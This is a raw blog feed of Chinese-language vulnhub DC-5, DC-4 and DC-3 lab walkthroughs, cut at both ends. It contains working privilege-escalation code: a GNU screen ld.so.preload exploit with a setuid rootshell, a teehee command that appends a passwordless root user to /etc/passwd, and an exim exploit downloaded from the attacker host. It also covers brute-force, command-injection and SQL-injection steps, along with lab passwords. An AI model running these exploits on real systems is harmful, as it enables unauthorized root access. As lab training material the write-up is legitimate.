class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认文件写入成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222042350.png" alt="image-20240105222042350"></p><p>然后编译这个脚本,查看编译生成的os文件</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o libhax<span class="token punctuation">.</span>so libhax<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222145012.png" alt="image-20240105222145012"></p><h3 id="5-将第二部分的代码写入rootshell-c并编译"><a href="#5-将第二部分的代码写入rootshell-c并编译" class="headerlink" title="(5)将第二部分的代码写入rootshell.c并编译"></a>(5)将第二部分的代码写入rootshell.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">将第二部分的代码写入rootshell<span class="token punctuation">.</span>c文件并执行命令生成rootshell文件这里我直接采用vim创建文件因为步骤和第一部分是一样的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222916118.png" alt="image-20240105222916118"></p><p>写入文件如下</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译这个脚本,查看编译生成的os文件</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o rootshell<span class="token punctuation">.</span>so rootshell<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105223042140.png" alt="image-20240105223042140"></p><h3 id="6-将第三部分代码写入dc5-sh文件"><a href="#6-将第三部分代码写入dc5-sh文件" class="headerlink" title="(6)将第三部分代码写入dc5.sh文件"></a>(6)将第三部分代码写入dc5.sh文件</h3><p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!&#x2F;bin&#x2F;bash表示执行环境。最后保存是需要输入:set ff&#x3D;unix是为了防止脚本的格式错误。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">#!<span class="token operator">/</span>bin<span class="token operator">/</span>bashecho <span class="token string">"[+] Now we create our /etc/ld.so.preload file..."</span><span class="token keyword">cd</span> <span class="token operator">/</span>etcumask <span class="token number">000</span> # because<span class="token keyword">screen</span> -D -m -L <span class="token keyword">ld</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload echo -ne  <span class="token string">"\x0a/tmp/libhax.so"</span> # newline neededecho <span class="token string">"[+] Triggering..."</span><span class="token keyword">screen</span> -ls # <span class="token keyword">screen</span> itself <span class="token keyword">is</span> setuid<span class="token punctuation">,</span> so<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>tmp<span class="token operator">/</span>rootshell <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">:</span><span class="token keyword">set</span> ff<span class="token operator">=</span>unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105224111589.png" alt="image-20240105224111589"></p><p>完成3个步骤后之间把三个文件上传至靶机的&#x2F;tmp文件下，然后执行.&#x2F;dc5即可提权。<br>将这三个文件传到靶机</p><h2 id="5-上传文件到蚁剑"><a href="#5-上传文件到蚁剑" class="headerlink" title="5.上传文件到蚁剑"></a>5.上传文件到蚁剑</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225226138.png" alt="image-20240105225226138"></p><p>执行dc5.sh</p><p>注意给dc5.sh加执行权限</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">chmod <span class="token operator">+</span>x dc5<span class="token punctuation">.</span>shchmod <span class="token number">777</span> dc5<span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225541899.png" alt="image-20240105225541899"></p><p>拿到root用户，成功提权<br>在root目录下拿到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225605774.png" alt="image-20240105225605774"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1、靶场下载地址<br>2、nmap<br>3、文中用到的字典<br>4、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>5、[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包）<br>6、简谈SUID提权<br>7、实现交互式shell的几种方式<br>8、masscan<br>9、[ 常用工具篇 ] AntSword 蚁剑安装及使用详解<br>10、Web日志目录及日志分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-4</title>
    <link href="http://ms02423.top/2023/11/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-4/"/>
    <id>http://ms02423.top/2023/11/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-4/</id>
    <published>2023-11-01T05:06:06.000Z</published>
    <updated>2023-11-05T12:53:06.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h2><h3 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-4 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>Unlike the previous DC releases<span class="token punctuation">,</span> this one <span class="token keyword">is</span> designed primarily <span class="token keyword">for</span> beginners<span class="token operator">/</span>intermediates<span class="token punctuation">.</span> There <span class="token keyword">is</span> only one flag<span class="token punctuation">,</span> but technically<span class="token punctuation">,</span> <span class="token keyword">multiple</span> <span class="token keyword">entry</span> points <span class="token operator">and</span> <span class="token keyword">just</span> like <span class="token keyword">last</span> <span class="token keyword">time</span><span class="token punctuation">,</span> <span class="token keyword">no</span> clues<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h3 id="2-下载靶场环境"><a href="#2-下载靶场环境" class="headerlink" title="2.下载靶场环境"></a>2.下载靶场环境</h3><p>靶场下载地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://www.vulnhub.com/entry/dc-4,313/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下来的文件如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175409887.png" alt="image-20231105175409887"></p><h3 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h3><p>下载下来是虚拟机压缩文件，直接用Vmvare导入就行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175509992.png" alt="image-20231105175509992"></p><p>虚拟机开启之后界面如下，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175549010.png" alt="image-20231105175549010"></p><h2 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h2><h3 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h3><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175733083.png" alt="image-20231105175733083"></p><h3 id="2-寻找靶机真实IP"><a href="#2-寻找靶机真实IP" class="headerlink" title="2.寻找靶机真实IP"></a>2.寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105175817726.png" alt="image-20231105175817726"></p><p>192.168.52.152是kali的ip地址，可以知道靶场ip地址是192.168.52.135</p><h3 id="3-探端口及服务"><a href="#3-探端口及服务" class="headerlink" title="3.探端口及服务"></a>3.探端口及服务</h3><p>使用nmap探活端口</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180101182.png" alt="image-20231105180101182"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，存在ssh服务，OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>4p1发现开放了<span class="token number">80</span>端口，存在web服务，nginx <span class="token number">1.15</span><span class="token number">.10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们进行指纹识别</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180345525.png" alt="image-20231105180345525"></p><h3 id="4-访问服务"><a href="#4-访问服务" class="headerlink" title="4.访问服务"></a>4.访问服务</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105180521906.png" alt="image-20231105180521906"></p><h3 id="5-爆破用户名和密码"><a href="#5-爆破用户名和密码" class="headerlink" title="5.爆破用户名和密码"></a>5.爆破用户名和密码</h3><p>这里使用bp尝试获取弱口令抓个包，发送到爆破模块</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181347606.png" alt="image-20231105181347606"></p><p>设置好爆破点</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181442191.png" alt="image-20231105181442191"></p><p>用户名我使用常见用户名字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181600330.png" alt="image-20231105181600330"></p><p>字典使用1000-top</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181655111.png" alt="image-20231105181655111"></p><p>爆破中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181732105.png" alt="image-20231105181732105"></p><p>爆破结果如下：<br>发现admin&#x2F;happy这一组返回包长度最长，猜想他就是账号密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105181854739.png" alt="image-20231105181854739"></p><p>登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105182210606.png" alt="image-20231105182210606"></p><h3 id="6-命令执行"><a href="#6-命令执行" class="headerlink" title="6.命令执行"></a>6.命令执行</h3><p>发现这里可以执行三种命令<br>点击list files好像是执行了ls -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105182248635.png" alt="image-20231105182248635"></p><p>点击run抓个包看一下<br>发现真的是执行了ls -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192839659.png" alt="image-20231105192839659"></p><p>发现执行了ls并回返值，猜想能不能执行任意命令,把抓到的包放入重放攻击模块修改命令进行重放攻击由上面ls -l拼接方式看，我们可以知道空格使用+代替执行ls</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192859745.png" alt="image-20231105192859745"></p><p>执行whoami</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105192939330.png" alt="image-20231105192939330"></p><p>执行id</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193017159.png" alt="image-20231105193017159"></p><p>执行ipadd</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193043822.png" alt="image-20231105193043822"></p><p>由上面的测试可知确实存在任意命令执行，空格由+代替</p><h3 id="7-反弹shell到kali"><a href="#7-反弹shell到kali" class="headerlink" title="7.反弹shell到kali"></a>7.反弹shell到kali</h3><p>1)攻击机监听</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193749216.png" alt="image-20231105193749216"></p><p>2)靶机连接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193812943.png" alt="image-20231105193812943"></p><p>3)反弹shell成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193856932.png" alt="image-20231105193856932"></p><h3 id="8-进入交互式shell"><a href="#8-进入交互式shell" class="headerlink" title="8.进入交互式shell"></a>8.进入交互式shell</h3><p>我们知道上面的到的shell不好用，我们进入交互式shell</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105193958607.png" alt="image-20231105193958607"></p><h3 id="9-teehee提权"><a href="#9-teehee提权" class="headerlink" title="9.teehee提权"></a>9.teehee提权</h3><p>这个靶机可以使用exim4提权也可以使用teehee提权，两种提权方式选择一种即可</p><p>1)查看当前权限</p><p>查看当前权限，不是root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194150291.png" alt="image-20231105194150291"></p><p>2)发现old-passwords.bak文件</p><p>查看系统里面有什么文件在&#x2F;home&#x2F;jim&#x2F;backups下看到一个old-passwords.bak文件，看名字应该是一堆密码，而且是jim用户使用过的密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194333231.png" alt="image-20231105194333231"></p><p>打开看一下发现一堆密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194417486.png" alt="image-20231105194417486"></p><p>感觉可以做爆破字典把文件保存下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105194720565.png" alt="image-20231105194720565"></p><p>3)爆破出jim的ssh密码<br>使用hydra爆破一下ssh密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">hydra -l jim -P <span class="token string">'/home/kali/桌面/password.txt'</span>  <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.135</span> ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用户名为jim，密码为我们保存的old-passwords.bak.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195131263.png" alt="image-20231105195131263"></p><p>果然爆破出一个一对用户密码:jim&#x2F;jibril04</p><p>4)使用kali登录jim</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195235521.png" alt="image-20231105195235521"></p><p>5)发现charles用户密码</p><p>继续探索在&#x2F;var&#x2F;spool&#x2F;mail目录下发现一封名为jim的邮件邮件内容大致为：我今天要去度假了，所以老板让我给你我的密码，以防有什么事情发生错了。也就是说这里我们又拿到了一个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Charles<span class="token operator">/</span>^xHhA<span class="token operator">&amp;</span>hvim0y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195443134.png" alt="image-20231105195443134"></p><p>直接su 切换用户试试,提示没有这个用户名，那很明显首字母我们需要小写</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195528486.png" alt="image-20231105195528486"></p><p>密码是^xHhA&amp;hvim0y</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195610962.png" alt="image-20231105195610962"></p><p>10.teehee提权</p><p>1)查看使用sudo运行的命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195725838.png" alt="image-20231105195725838"></p><p>2)执行如下命令进行提权:echo “admin::0:0:::&#x2F;bin&#x2F;bash” | sudo teehee -a &#x2F;etc&#x2F;passwd </p><p>命令的意思大致利用teehee为把如下信息写到&#x2F;etc&#x2F;passwd里面，在用户名admin 没有密码为管理员权限，进入的时候运行&#x2F;bin&#x2F;bash</p><p>3)&#x2F;etc&#x2F;passwd 内每个字段含义如下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">admin<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span>bin<span class="token operator">/</span>bashusername<span class="token punctuation">:</span><span class="token keyword">password</span><span class="token punctuation">:</span>User <span class="token keyword">ID</span><span class="token punctuation">:</span><span class="token keyword">Group</span> <span class="token keyword">ID</span><span class="token punctuation">:</span>comment<span class="token punctuation">:</span>home directory<span class="token punctuation">:</span>shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4)成功提权为root</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105195954856.png" alt="image-20231105195954856"></p><p>10.发现flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200110829.png" alt="image-20231105200110829"></p><h3 id="10-exim4提权"><a href="#10-exim4提权" class="headerlink" title="10.exim4提权"></a>10.exim4提权</h3><p>1)查看当前权限</p><p>查看当前权限，不是root权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200631938.png" alt="image-20231105200631938"></p><p>2)发现可以用exim4进行提权</p><p>看看具有SUID权限的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现exim4命令具有SUID权限，exim4是可以用来提权的</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200727171.png" alt="image-20231105200727171"></p><p>查看查看exim4版本，发现exim4版本为4.89</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200810672.png" alt="image-20231105200810672"></p><p>3)寻找exim4提权脚本</p><p>本地漏洞库查找exim 4漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105200939607.png" alt="image-20231105200939607"></p><p>exim4版本为4.89，发现有好几个可以用，还有两个提权，这里我们选用46996</p><p>4)上传提权脚本到靶机</p><p>开启apache服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start apache2.service <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将选用的46996拷贝到kali的apache web页面下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201115741.png" alt="image-20231105201115741"></p><p>访问kali服务下载提权脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201319417.png" alt="image-20231105201319417"></p><p>DC-4下载提权脚本</p><p>wget <a href="http://192.168.52.152/46996.sh">http://192.168.52.152/46996.sh</a></p><p>提示可以访问，但拒绝访问，可能是目录权限不够，尝试切换到&#x2F;tmp目录进行下载</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201427670.png" alt="image-20231105201427670"></p><p>成功下载提权脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201514483.png" alt="image-20231105201514483"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201553893.png" alt="image-20231105201553893"></p><p>5)exim4提权</p><p>我们已经上传了提权脚本到靶机，接下来我们需要运行脚本进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201643908.png" alt="image-20231105201643908"></p><p>查看脚本权限，发现没有执行权限，我们需要给脚本加执行权限</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105201711413.png" alt="image-20231105201711413"></p><p>6)执行脚本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202016060.png" alt="image-20231105202016060"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202200536.png" alt="image-20231105202200536"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231105202234404.png" alt="image-20231105202234404"></p><h1 id="三、相关资源"><a href="#三、相关资源" class="headerlink" title="三、相关资源"></a>三、相关资源</h1><p>1、靶场下载地址<br>2、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>3、[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包）<br>4、arp-scan<br>5、文中用到的字典<br>6、nmap<br>7、masscan<br>8、whatweb<br>9、实现交互式shell的几种方式<br>10、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>11、提权辅助工具集合<br>12、简谈SUID提权<br>13、[ 常用工具篇 ] AntSword 蚁剑安装及使用详解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h2&gt;&lt;h3 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-3</title>
    <link href="http://ms02423.top/2023/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-3/"/>
    <id>http://ms02423.top/2023/10/23/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-3/</id>
    <published>2023-10-23T06:40:16.000Z</published>
    <updated>2023-10-30T07:37:37.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一. 环境搭建"></a>一. 环境搭建</h1><h2 id="1-靶机描述"><a href="#1-靶机描述" class="headerlink" title="1.靶机描述"></a>1.靶机描述</h2><p>DC-3是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与以前的 DC 版本一样，这个版本是为初学者设计的，尽管这一次只有一个标志，一个入口点，根本没有任何线索。</p><p>Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。</p><h2 id="2-靶机下载地址"><a href="#2-靶机下载地址" class="headerlink" title="2.靶机下载地址"></a>2.靶机下载地址</h2><p>  <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p><h2 id="3-网卡设置"><a href="#3-网卡设置" class="headerlink" title="3.网卡设置"></a>3.网卡设置</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144642255.png" alt="image-20231023144642255"></p><p>我们开启虚拟机，但是遇到了问题</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144659544.png" alt="image-20231023144659544"></p><p>我们通过下面方法解决:</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/123677000">https://blog.csdn.net/Aluxian_/article/details/123677000</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144714116.png" alt="image-20231023144714116"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144723375.png" alt="image-20231023144723375"></p><h1 id="二-靶机渗透"><a href="#二-靶机渗透" class="headerlink" title="二.靶机渗透"></a>二.靶机渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>我们使用nmap扫描，确定靶场地址</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023144857076.png" alt="image-20231023144857076"></p><p>我们知道192.168.52.128&#x2F;152是kali地址</p><p>靶机地址为192.168.52.133</p><h2 id="2-进行端口扫描及服务"><a href="#2-进行端口扫描及服务" class="headerlink" title="2.进行端口扫描及服务"></a>2.进行端口扫描及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145038066.png" alt="image-20231023145038066"></p><p>只有一个80端口，服务是apache2</p><h2 id="3-访问服务"><a href="#3-访问服务" class="headerlink" title="3.访问服务"></a>3.访问服务</h2><p>我们进行访问<a href="http://192.168.52.133/">http://192.168.52.133</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145143835.png" alt="image-20231023145143835"></p><p>我们知道是一个joomla插件</p><h2 id="4-进行渗透测试"><a href="#4-进行渗透测试" class="headerlink" title="4.进行渗透测试"></a>4.进行渗透测试</h2><p>1)Joomla 是类似织梦、wp等流行的一款CMS软件，可以非常快速地发布一个精美的网站。在kali下如何检测Joomla是否存在可以利用的漏洞呢？如果您的网站正在运行 Joomla，您可以对您的网站使用 JoomScan 实用程序来发现漏洞或仅提供有助于攻击您网站的一般信息。一旦您意识到该网站的弱点，您就可以采取适当的措施来保护它。JoomScan 的工作原理与 WPScan 类似，后者用于扫描 WordPress 网站的漏洞。</p><p>2)OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。</p><p>3)使用该–url或者-u参数指定 Joomla 站点的 URL，以便使用 JoomScan 对其进行扫描</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">joomscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.133</span><span class="token operator">/</span>joomscan -u http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.133</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145824186.png" alt="image-20231023145824186"></p><p>4)我们扫描到了后台地址和版本3.7.0</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023145919326.png" alt="image-20231023145919326"></p><p>5)我们使用kali的searchsploit检测漏洞</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150200692.png" alt="image-20231023150200692"></p><p>可以看到存在SQL注入漏洞</p><h2 id="5-漏洞验证"><a href="#5-漏洞验证" class="headerlink" title="5.漏洞验证"></a>5.漏洞验证</h2><p>1)使用poc进行SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150433270.png" alt="image-20231023150433270"></p><p>2)验证漏洞是否存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150706213.png" alt="image-20231023150706213"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150736457.png" alt="image-20231023150736457"></p><p>可以看到存在SQL注入漏洞</p><p>3)我们爆破数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150839408.png" alt="image-20231023150839408"></p><p>4)我们爆破joomladb数据库的表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023150953322.png" alt="image-20231023150953322"></p><p>我们可以看到_users这个表名</p><p>5)我们进行爆破_users表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152237346.png" alt="image-20231023152237346"></p><p>我们可以看到用户名和密码</p><p>6)我们进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152428205.png" alt="image-20231023152428205"></p><p>我们可以看到用户名爆破出来了，密码是加密的，我们进行解密</p><p>7)解密密码</p><p>我们可以看到密码首部是2y，表示该加密方式为Blowfish。</p><p>我们使用john爆破密码</p><p>john 是一款大受欢迎的、免费的开源软件、基于字典的密码破解工具。用于在已知密文的情况下尝试破解出明文的破解密码软件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023152618490.png" alt="image-20231023152618490"></p><p>我们爆破密码是snoopy</p><h2 id="6-文件上传漏洞"><a href="#6-文件上传漏洞" class="headerlink" title="6.文件上传漏洞"></a>6.文件上传漏洞</h2><p>1)我们登录网站</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231023160537295.png" 